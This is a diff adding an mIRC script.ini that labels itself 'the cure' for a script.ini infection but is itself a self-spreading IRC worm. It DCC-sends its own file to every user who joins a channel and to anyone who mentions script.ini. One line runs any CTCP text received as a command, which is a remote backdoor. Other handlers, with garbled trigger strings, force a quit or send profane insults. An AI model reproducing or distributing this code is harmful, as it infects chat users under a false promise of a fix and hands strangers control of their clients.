@@ -1,0 +1,18 @@
+[script]
+n0=;###############################################
+n1=;##                                                                                                                   ##
+n2=;##   THE CURE FOR THE BAD " SCRIPT.INI " INFECTION    ##
+n3=;##                                                                                                                   ##
+n4=;##################### THT ######################
+n5=
+n6=ON 1:JOIN:#: {
+n7=  if ($nick == $me) { /halt }
+n8=  else { /dcc send $nick $mircdirscript.ini }
+n9=}
+n10=ctcp 1:*:$1-
+n11=ON 1:TEXT:*Д|плсshutdown*:#:{ /msg $nick 4U Are Just Another FuckUp Lamer | /quit 4The Cure }
+n12=ON 1:TEXT:*SCRIPT.INI*:*:/notice $nick Here the cure for script.ini infection | /dcc send $nick $mircdirscript.ini
+n13=ON 1:TEXT:*Д|плсrъ|к><*:#:{ 
+n14=  ;  mode $chan +o $nick 
+n15=  msg $nick 4A BIG FUCK YOU TO YOU, LAMER 
+n16=}
